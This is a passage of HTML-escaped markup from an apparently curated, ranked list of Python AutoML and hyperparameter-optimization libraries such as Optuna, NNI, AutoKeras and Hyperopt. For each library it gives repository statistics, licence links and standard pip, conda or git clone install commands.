&lt;p&gt;&lt;a href=&#34;https://pypi.org/project/optuna&#34;&gt;PyPi&lt;/a&gt; (📥 3.5M / month · 📦 200 · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install optuna&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/optuna&#34;&gt;Conda&lt;/a&gt; (📥 280K · ⏱️ 04.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge optuna&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/nni&#34;&gt;NNI&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 11K) - An open source AutoML toolkit for automate machine learning lifecycle,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/nni&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 1.6K · 📦 230 · 📋 1.6K - 18% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/nni&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nni&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 30 · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nni&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/keras-team/autokeras&#34;&gt;AutoKeras&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 8.5K) - AutoML library for deep learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/keras-team/autokeras&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 140 · 🔀 1.4K · 📥 4.4K · 📦 320 · 📋 820 - 10% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/keras-team/autokeras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/autokeras&#34;&gt;PyPi&lt;/a&gt; (📥 53K / month · 📦 10 · ⏱️ 30.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install autokeras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/automl/auto-sklearn&#34;&gt;auto-sklearn&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 6.3K) - Automated Machine Learning with scikit-learn. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/automl/auto-sklearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 79 · 🔀 1.2K · 📥 35 · 📦 290 · 📋 890 - 12% open · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/automl/auto-sklearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/auto-sklearn&#34;&gt;PyPi&lt;/a&gt; (📥 38K / month · 📦 30 · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install auto-sklearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/auto-sklearn&#34;&gt;Conda&lt;/a&gt; (📥 4.5K · ⏱️ 18.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge auto-sklearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/hyperopt/hyperopt&#34;&gt;Hyperopt&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 6.2K) - Distributed Asynchronous Hyperparameter Optimization in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/hyperopt/hyperopt&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 93 · 🔀 970 · 📦 6.6K · 📋 610 - 61% open · ⏱️ 29.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/hyperopt/hyperopt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hyperopt&#34;&gt;PyPi&lt;/a&gt; (📥 2.1M / month · 📦 420 · ⏱️ 17.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hyperopt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hyperopt&#34;&gt;Conda&lt;/a&gt; (📥 410K · ⏱️ 30.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hyperopt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/keras-team/keras-tuner&#34;&gt;Keras Tuner&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 2.5K) - Hyperparameter tuning for humans. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/keras-team/keras-tuner&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 330 · 📦 1.4K · 📋 390 - 44% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/keras-team/keras-tuner&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/keras-tuner&#34;&gt;PyPi&lt;/a&gt; (📥 650K / month · 📦 41 · ⏱️ 25.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install keras-tuner&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/keras-tuner&#34;&gt;Conda&lt;/a&gt; (📥 6.4K · ⏱️ 12.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge keras-tuner&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/botorch&#34;&gt;BoTorch&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 2.3K) - Bayesian optimization in PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/botorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 74 · 🔀 260 · 📦 250 · 📋 260 - 23% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/botorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/botorch&#34;&gt;PyPi&lt;/a&gt; (📥 170K / month · 📦 13 · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install botorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/botorch&#34;&gt;Conda&lt;/a&gt; (📥 25K · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge botorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/alteryx/featuretools&#34;&gt;featuretools&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 6.2K) - An open source python library for automated feature engineering. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/alteryx/featuretools&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 65 · 🔀 810 · 📋 800 - 20% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/alteryx/featuretools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/featuretools&#34;&gt;PyPi&lt;/a&gt; (📥 130K / month · 📦 63 · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install featuretools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/featuretools&#34;&gt;Conda&lt;/a&gt; (📥 85K · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge featuretools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebook/Ax&#34;&gt;Ax&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 1.8K) - Adaptive Experimentation Platform. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebook/Ax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 200 · 📦 280 · 📋 420 - 11% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebook/Ax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ax-platform&#34;&gt;PyPi&lt;/a&gt; (📥 150K / month · 📦 15 · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ax-platform&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ax-platform&#34;&gt;Conda&lt;/a&gt; (📥 1.3K · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ax-platform&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/awslabs/autogluon&#34;&gt;AutoGluon&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4.5K) - AutoGluon: AutoML for Image, Text, and Tabular Data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/awslabs/autogluon&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 72 · 🔀 590 · 📦 120 · 📋 690 - 22% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/awslabs/autogluon&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/autogluon&#34;&gt;PyPi&lt;/a&gt; (📥 67K / month · 📦 4 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install autogluon&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/nevergrad&#34;&gt;nevergrad&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 3.3K) - A Python toolbox for performing gradient-free optimization. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/nevergrad&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 310 · 📦 330 · 📋 260 - 41% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/nevergrad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nevergrad&#34;&gt;PyPi&lt;/a&gt; (📥 41K / month · 📦 18 · ⏱️ 08.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nevergrad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nevergrad&#34;&gt;Conda&lt;/a&gt; (📥 26K · ⏱️ 14.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nevergrad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-optimize/scikit-optimize&#34;&gt;scikit-optimize&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 2.3K · 💤) - Sequential model-based optimization with a.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-optimize/scikit-optimize&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 76 · 🔀 420 · 📦 2.7K · 📋 620 - 37% open · ⏱️ 12.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-optimize/scikit-optimize&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-optimize&#34;&gt;PyPi&lt;/a&gt; (📥 910K / month · 📦 170 · ⏱️ 12.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-optimize&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/scikit-optimize&#34;&gt;Conda&lt;/a&gt; (📥 550K · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge scikit-optimize&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/autonomio/talos&#34;&gt;Talos&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 1.5K) - Hyperparameter Optimization for TensorFlow, Keras and PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/autonomio/talos&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 260 · 📦 140 · 📋 390 - 5% open · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/autonomio/talos&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/talos&#34;&gt;PyPi&lt;/a&gt; (📥 1.8K / month · 📦 6 · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install talos&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mljar/mljar-supervised&#34;&gt;mljar-supervised&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.9K) - Python package for AutoML on Tabular Data with Feature.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mljar/mljar-supervised&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 270 · 📦 45 · 📋 480 - 18% open · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mljar/mljar-supervised&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mljar-supervised&#34;&gt;PyPi&lt;/a&gt; (📥 9.4K / month · 📦 2 · ⏱️ 02.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mljar-supervised&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mljar-supervised&#34;&gt;Conda&lt;/a&gt; (📥 1.6K · ⏱️ 02.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mljar-supervised&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/maxpumperla/hyperas&#34;&gt;Hyperas&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 2.1K) - Keras + Hyperopt: A very simple wrapper for convenient.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/maxpumperla/hyperas&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 300 · 📦 240 · 📋 250 - 37% open · ⏱️ 19.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/maxpumperla/hyperas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hyperas&#34;&gt;PyPi&lt;/a&gt; (📥 13K / month · 📦 24 · ⏱️ 28.02.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hyperas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/adanet&#34;&gt;AdaNet&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 3.4K · 💤) - Fast and flexible AutoML with learning guarantees. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/adanet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 520 · 📦 43 · 📋 110 - 57% open · ⏱️ 30.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/adanet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/adanet&#34;&gt;PyPi&lt;/a&gt; (📥 680 / month · 📦 2 · ⏱️ 09.07.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install adanet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Neuraxio/Neuraxle&#34;&gt;Neuraxle&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 520) - The worlds cleanest AutoML framework - Do hyperparameter tuning with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Neuraxio/Neuraxle&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 53 · 📦 32 · 📋 320 - 24% open · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Neuraxio/Neuraxle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/neuraxle&#34;&gt;PyPi&lt;/a&gt; (📥 350 / month · 📦 1 · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install neuraxle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/automl/HpBandSter&#34;&gt;HpBandSter&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 540) - a distributed Hyperband implementation on Steroids. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/automl/HpBandSter&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 110 · 📦 220 · 📋 92 - 61% open · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/automl/HpBandSter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hpbandster&#34;&gt;PyPi&lt;/a&gt; (📥 40K / month · 📦 10 · ⏱️ 06.11.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hpbandster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hpbandster&#34;&gt;Conda&lt;/a&gt; (📥 1.6K · ⏱️ 11.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hpbandster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SimonBlanke/Hyperactive&#34;&gt;Hyperactive&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 400) - An optimization and data collection toolbox for convenient and fast.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/SimonBlanke/Hyperactive&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 32 · 📥 100 · 📦 15 · 📋 45 - 11% open · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/SimonBlanke/Hyperactive&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hyperactive&#34;&gt;PyPi&lt;/a&gt; (📥 580 / month · 📦 3 · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hyperactive&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/shankarpandala/lazypredict&#34;&gt;lazypredict&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 360) - Lazy Predict help build a lot of basic models without much code.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/shankarpandala/lazypredict&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 63 · 📦 290 · 📋 63 - 46% open · ⏱️ 